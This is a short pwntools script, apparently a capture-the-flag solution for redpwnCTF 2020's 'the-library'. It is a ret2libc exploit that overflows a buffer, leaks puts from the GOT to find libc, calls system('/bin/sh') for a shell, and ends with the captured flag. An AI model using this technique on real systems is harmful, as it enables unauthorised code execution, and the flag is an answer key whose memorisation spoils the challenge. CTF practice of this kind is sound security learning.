#!/usr/bin/env python
from pwn import *

context.log_level = "debug"
context.binary = elf = ELF('the-library')
libc = ELF('./libc.so.6')
# p = process(elf.path)
# gdb.attach(p, 'init-gef')
p = remote('2020.redpwnc.tf', 31350)

offset = cyclic_find("gaaa")
pop_rdi = 0x0000000000400733
ret = 0x0000000000400506

payload = flat([
    pop_rdi, elf.got['puts'],
    elf.symbols['puts'],
    elf.symbols['main']
])

p.sendlineafter("What's your name?", "A"*offset + payload)
p.recvuntil("Hello there: \n")
p.recvline()
leak = u64(p.recvline(False).ljust(8,'\x00'))
libc_base = leak - 0x809c0
log.info("libc : 0x{:x}".format(libc_base))

bin_sh = libc_base + libc.search("/bin/sh").next()
system = libc_base + libc.symbols['system']

payload = flat([
    pop_rdi, bin_sh,
    ret,
    system
])

p.sendlineafter("What's your name?", "A"*offset + payload)

p.interactive()
# flag{jump_1nt0_th3_l1brary}
